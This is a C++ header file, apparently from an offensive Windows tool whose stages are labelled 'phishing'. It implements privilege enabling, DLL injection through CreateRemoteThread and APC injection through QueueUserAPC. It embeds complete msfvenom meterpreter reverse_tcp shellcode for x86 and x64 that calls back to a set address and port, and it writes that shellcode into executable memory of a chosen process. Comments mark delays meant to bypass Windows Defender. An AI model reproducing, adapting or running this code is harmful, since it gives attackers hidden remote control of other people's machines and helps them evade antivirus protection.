#pragma once

#include <TlHelp32.h>
#include "Basic.h"

void ShowError(const char* msg) {

	std::cout << "[Error] " << msg << std::endl;
	std::cout << "ERROR NUM: " << GetLastError() << std::endl;
}

BOOL EnablePrivileges(HANDLE hProcess, LPCSTR pszPrivilegesName) {

	HANDLE hToken = NULL;
	LUID luidValue = { 0 };
	TOKEN_PRIVILEGES tokenPrivileges = { 0 };
	BOOL bRet = FALSE;
	DWORD dwRet = 0;

	bRet = OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES, &hToken);
	if (bRet == FALSE) {
		ShowError("OpenProcessToken");
		return FALSE;
	}

	// Get Local System pszPrivileges LUID Value
	bRet = LookupPrivilegeValueA(NULL, pszPrivilegesName, &luidValue);
	if (bRet == FALSE) {
		ShowError("LookupPrivilegeValueA");
		return FALSE;
	}

	// Set Improve Privileges info
	tokenPrivileges.PrivilegeCount = 1;
	tokenPrivileges.Privileges[0].Luid = luidValue;
	tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	// Privilege Escalation
	bRet = AdjustTokenPrivileges(hToken, FALSE, &tokenPrivileges, 0, 0, NULL);
	if (bRet == FALSE) {
		ShowError("AdjustTokenPrivileges");
		return FALSE;
	}
	else {
		dwRet = GetLastError();
		if (dwRet == ERROR_SUCCESS) {
			return TRUE;
		}
		else if (dwRet == ERROR_NOT_ALL_ASSIGNED) {
			ShowError("ERROR_NOT_ALL_ASSIGNED");
			return FALSE;
		}
	}
	return FALSE;

}

DWORD GetProcessPid(LPCWSTR szProcessName){
	
	DWORD PID = 0;
	PROCESSENTRY32 processinfo = { 0 };
	processinfo.dwSize = sizeof(PROCESSENTRY32);

	// Create Snapshot
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot == INVALID_HANDLE_VALUE) {
		ShowError("CreateToolhelp32Snapshot");
		return -1;
	}
	BOOL isSuccess = Process32First(hSnapshot, &processinfo);
	
	if (isSuccess == FALSE) {
		ShowError("Process32First");
		return -1;
	}

	do
	{
		if (!lstrcmp(szProcessName, processinfo.szExeFile))
		{
			PID = processinfo.th32ProcessID;
			break;
		}

	} while (Process32Next(hSnapshot, &processinfo));

	CloseHandle(hSnapshot);
	return PID;
}



// RemoteThreadInjection
// Due to the lack of stability and scalability, this scheme is abandoned
// 2022-11-14
// Author: L3vi4th4n

// phishing 1.0
//BOOL RemoteThreadInject(DWORD PID, const char* pszDllFileName) {
//
//	HANDLE hProcess = NULL;
//	SIZE_T dwSize = 0;
//	LPVOID pDllAddr = NULL;
//	FARPROC pFuncProcAddr = NULL;
//
//	// Get Process Handle
//	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
//	if (hProcess == NULL) {
//		ShowError("OpenProcess");
//		return FALSE;
//	}
//
//	dwSize = sizeof pszDllFileName + 1;
//	pDllAddr = VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);
//	if (pDllAddr == NULL) {
//		ShowError("VirtualAllocEx");
//		return FALSE;
//	}
//
//	if (WriteProcessMemory(hProcess, pDllAddr, (LPVOID)pszDllFileName, dwSize, NULL) == FALSE) {
//		ShowError("WriteProcessMemory");
//		return FALSE;
//	}
//
//	pFuncProcAddr = GetProcAddress(GetModuleHandle(TEXT("kernel32.dll")), "LoadLibraryW");
//	if (NULL == pFuncProcAddr)
//	{
//		ShowError("GetProcAddress_LoadLibraryA");
//		return FALSE;
//	}
//
//	HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, (PTHREAD_START_ROUTINE)pFuncProcAddr, pDllAddr, 0, NULL);
//	if (NULL == hRemoteThread)
//	{
//		ShowError("CreateRemoteThread");
//		return FALSE;
//	}
//	CloseHandle(hProcess);
//
//}


// phishing 1.5

BOOL CreateRemoteThreadInjectDll(DWORD dwProcessId, const char* pszDllFileName)
{
	HANDLE hProcess = NULL;
	SIZE_T dwSize = 0;
	LPVOID pDllAddr = NULL;
	FARPROC pFuncProcAddr = NULL;

	// Get Process Handle
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
	if (NULL == hProcess)
	{
		ShowError("OpenProcess");
		return FALSE;
	}
	//allocated memory in the injection process
	dwSize = 1 + strlen(pszDllFileName);
	pDllAddr = VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);
	if (NULL == pDllAddr)
	{
		ShowError("VirtualAllocEx");
		return FALSE;
	}
	//Write data to the allocated memory
	if (FALSE == WriteProcessMemory(hProcess, pDllAddr, pszDllFileName, dwSize, NULL))
	{
		ShowError("WriteProcessMemory");
		return FALSE;
	}
	// Sleep(1352); // Bypass Windows defender
	// Get LoadLibraryA function address
	pFuncProcAddr = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");
	if (NULL == pFuncProcAddr)
	{
		ShowError("GetProcAddress_LoadLibraryA");
		return FALSE;
	}
	// Sleep(2910); // Bypass Windows defender
	// Use CreateRemoteThread to create a remote thread and implement DLL injection
	HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pFuncProcAddr, pDllAddr, 0, NULL);
	if (NULL == hRemoteThread)
	{
		ShowError("CreateRemoteThread");
		return FALSE;
	}
	// Close handle
	CloseHandle(hProcess);

	return TRUE;
}







// phishing 2.0
// APC INJECTION
BOOL InjectAPCbyPID(DWORD PID, LPVOID lpBaseAddress) {

	DWORD tid = 0;
	THREADENTRY32 threadEntry;
	threadEntry.dwSize = sizeof(THREADENTRY32);


	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);

	if (snapshot == INVALID_HANDLE_VALUE) {
		ShowError("CreateToolhelp32Snapshot");
	}

	if (Thread32First(snapshot, &threadEntry) == TRUE)
	{
		// Get the thread snapshot
		while (Thread32Next(snapshot, &threadEntry) == TRUE)
		{
			if (threadEntry.th32OwnerProcessID == PID)
			{
				std::cout << "[+] Found thread in target process PID: " << PID << std::endl;
				HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, threadEntry.th32ThreadID);
				tid = threadEntry.th32ThreadID;
				if (!hThread) {
					ShowError("OpenThread");
					continue;
				}

				// insert lpBaseAddress in APC queue :-)
				if (!QueueUserAPC((PAPCFUNC)lpBaseAddress, hThread, NULL)) {
					std::cout << "[-] QueueUserAPC error, trying next thread..." << std::endl;
				}
				else
				{
					std::cout << "[+] Shellcoded injected via QueueUserAPC" << std::endl;
					CloseHandle(hThread);
				}
			}
		}
		if (!tid) {
			std::cout << "[-] No threads were found in target process" << std::endl;
			CloseHandle(snapshot);
			return FALSE;
		}
	}
	else {
		ShowError("Thread32First");
	}

	CloseHandle(snapshot);
	return TRUE;
}


LPVOID shellcodeAddr(DWORD PID) {

	// Shellcode
#ifdef _X86_
	//msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.107.128 LPORT=4450 -f c -v shellcode
	unsigned char shellcode[] =
		"\xFC\xE8\x8F\x00\x00\x00\x60\x89\xE5\x31\xD2\x64\x8B\x52\x30\x8B"
		"\x52\x0C\x8B\x52\x14\x0F\xB7\x4A\x26\x8B\x72\x28\x31\xFF\x31\xC0"
		"\xAC\x3C\x61\x7C\x02\x2C\x20\xC1\xCF\x48\x01\xC7\x49\x75\xEF\x52"
		"\x57\x8B\x52\x10\x8B\x42\x3C\x01\xD0\x8B\x40\x78\x85\xC0\x74\x4C"
		"\x01\xD0\x50\x8B\x48\x18\x8B\x58\x20\x01\xD3\x85\xC9\x74\x3C\x31"
		"\xFF\x49\x8B\x34\x8B\x01\xD6\x31\xC0\xC1\xCF\x48\xAC\x01\xC7\x38"
		"\xE0\x75\xF4\x03\x7D\xF8\x3B\x7D\x24\x75\xE0\x58\x8B\x58\x24\x01"
		"\xD3\x66\x8B\x0C\x4B\x8B\x58\x1C\x01\xD3\x8B\x04\x8B\x01\xD0\x89"
		"\x44\x24\x24\x5B\x5B\x61\x59\x5A\x51\xFF\xE0\x58\x5F\x5A\x8B\x12"
		"\xE9\x80\xFF\xFF\xFF\x5D\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5F"
		"\x54\x68\xFB\xEB\x3E\xA7\x89\xE8\xFF\xD0\xB8\x90\x01\x00\x00\x29"
		"\xC4\x54\x50\x68\xB5\x3B\x42\x5B\xFF\xD5\x6A\x0A\x68\xC0\xA8\x6B"
		"\x80\x68\x02\x00\x11\x62\x89\xE6\x50\x50\x50\x50\x40\x50\x40\x50"
		"\x68\xAD\x2C\x3C\x2E\x83\xc5\x01\x83\xc5\xff\xFF\xD5\x97\x6A\x10\x56\x57\x68\x6F\x3C\xD4"
		"\x18\xFF\xD5\x85\xC0\x74\x0A\xFF\x4E\x08\x75\xEC\xE8\x67\x00\x00"
		"\x00\x6A\x00\x6A\x04\x56\x57\x68\x73\xD9\x64\xAC\xFF\xD5\x83\xF8"
		"\x00\x7E\x36\x8B\x36\x6A\x40\x68\x00\x10\x00\x00\x56\x6A\x00\x68"
		"\x39\xD8\x4F\xA8\xFF\xD5\x93\x53\x6A\x00\x56\x53\x57\x68\x73\xD9"
		"\x64\xAC\xFF\xD5\x83\xF8\x00\x7D\x28\x58\x68\x00\x40\x00\x00\x6A"
		"\x00\x50\x68\xBC\xDE\x31\xD3\xFF\xD5\x57\x68\xD8\xA7\x46\x89\xFF"
		"\xD5\x5E\x5E\xFF\x0C\x24\x0F\x85\x70\xFF\xFF\xFF\xE9\x9B\xFF\xFF"
		"\xFF\x01\xC3\x29\xC6\x75\xC1\xC3\xBB\xD9\x9B\x5F\xDB\x6A\x00\x53"
		"\xFF\xD5";

#endif

#ifdef _WIN64
	//msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.107.128 LPORT=4450 -f c -v shellcode
	unsigned char shellcode[] =
		"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
		"\x52\x51\x48\x31\xd2\x56\x65\x48\x8b\x52\x60\x48\x8b\x52"
		"\x18\x48\x8b\x52\x20\x4d\x31\xc9\x48\x0f\xb7\x4a\x4a\x48"
		"\x8b\x72\x50\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
		"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x48\x8b\x52\x20\x41"
		"\x51\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f"
		"\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x85\xc0"
		"\x74\x67\x48\x01\xd0\x8b\x48\x18\x50\x44\x8b\x40\x20\x49"
		"\x01\xd0\xe3\x56\x48\xff\xc9\x4d\x31\xc9\x41\x8b\x34\x88"
		"\x48\x01\xd6\x48\x31\xc0\x41\xc1\xc9\x0d\xac\x41\x01\xc1"
		"\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8"
		"\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
		"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41"
		"\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83"
		"\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9"
		"\x4b\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33\x32\x00"
		"\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00\x00\x49"
		"\x89\xe5\x49\xbc\x02\x00\x11\x62\xc0\xa8\x6b\x80\x41\x54"
		"\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5"
		"\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29\x80\x6b"
		"\x00\xff\xd5\x6a\x0a\x41\x5e\x50\x50\x4d\x31\xc9\x4d\x31"
		"\xc0\x48\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41"
		"\xba\xea\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58"
		"\x4c\x89\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5"
		"\x85\xc0\x74\x0a\x49\xff\xce\x75\xe5\xe8\x93\x00\x00\x00"
		"\x48\x83\xec\x10\x48\x89\xe2\x4d\x31\xc9\x6a\x04\x41\x58"
		"\x48\x89\xf9\x41\xba\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00"
		"\x7e\x55\x48\x83\xc4\x20\x5e\x89\xf6\x6a\x40\x41\x59\x68"
		"\x00\x10\x00\x00\x41\x58\x48\x89\xf2\x48\x31\xc9\x41\xba"
		"\x58\xa4\x53\xe5\xff\xd5\x48\x89\xc3\x49\x89\xc7\x4d\x31"
		"\xc9\x49\x89\xf0\x48\x89\xda\x48\x89\xf9\x41\xba\x02\xd9"
		"\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x41\x57\x59\x68"
		"\x00\x40\x00\x00\x41\x58\x6a\x00\x5a\x41\xba\x0b\x2f\x0f"
		"\x30\xff\xd5\x57\x59\x41\xba\x75\x6e\x4d\x61\xff\xd5\x49"
		"\xff\xce\xe9\x3c\xff\xff\xff\x48\x01\xc3\x48\x29\xc6\x48"
		"\x85\xf6\x75\xb4\x41\xff\xe7\x58\x6a\x00\x59\x49\xc7\xc2"
		"\xf0\xb5\xa2\x56\xff\xd5";
#endif



	// Open process with ALL_ACCESS
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
	if (hProcess == NULL) {
		ShowError("OpenProcess");
	}

	std::cout << "[+] Your hProcess is: " << hProcess << std::endl;

	// Allocate memory to inject malicious code in the target process
	LPVOID lpBaseAddress = (LPVOID)VirtualAllocEx(hProcess, NULL, 0x1000, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

	if (lpBaseAddress == NULL) {
		ShowError("VirtualAllocEx");
	}

	BOOL writeFlag = WriteProcessMemory(hProcess, lpBaseAddress, shellcode, sizeof(shellcode), 0);

	if (!writeFlag) {
		ShowError("WriteProcessMemory");
	}

	return lpBaseAddress;
}

void showProcess() {
	PROCESSENTRY32 processEntry;
	processEntry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if ((DWORD)snapshot < 1) {
		ShowError("CreateToolhelp32Snapshot");
	}

	if (Process32First(snapshot, &processEntry) == TRUE)
	{
		while (Process32Next(snapshot, &processEntry) == TRUE)
		{
			wprintf(L"%u \t\t %s\t\n", processEntry.th32ProcessID, processEntry.szExeFile);
		}

	}
	else {
		ShowError("Process32Frist");
	}
	CloseHandle(snapshot);
}